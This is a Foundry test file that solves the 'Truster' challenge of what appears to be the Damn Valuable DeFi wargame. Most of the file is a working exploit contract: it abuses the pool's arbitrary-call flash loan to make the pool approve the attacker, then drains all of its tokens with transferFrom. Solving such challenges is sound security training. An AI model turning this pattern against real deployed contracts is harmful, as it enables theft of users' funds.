// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract Exploit {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    address internal owner;

    constructor(address owner_) {
        owner = owner_;
    }

    modifier isOwner() {
        require(msg.sender == owner, "msg.sender must be owner.");
        _;
    }

    function exploit(address lenderPoolAddress_, address tokenAddress_)
        public
        isOwner
    {
        bytes memory transferPayload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            TOKENS_IN_POOL
        );

        ITrusterLenderPool(lenderPoolAddress_).flashLoan(
            0,
            address(this),
            tokenAddress_,
            transferPayload
        );

        IERC20(tokenAddress_).transferFrom(
            lenderPoolAddress_,
            address(owner),
            TOKENS_IN_POOL
        );
    }
}

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // Deploy exploit contract
        vm.startPrank(attacker);
        Exploit exploitContract = new Exploit(address(attacker));
        vm.stopPrank();

        // Conduct exploit
        vm.startPrank(attacker);
        exploitContract.exploit(address(trusterLenderPool), address(dvt));
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}
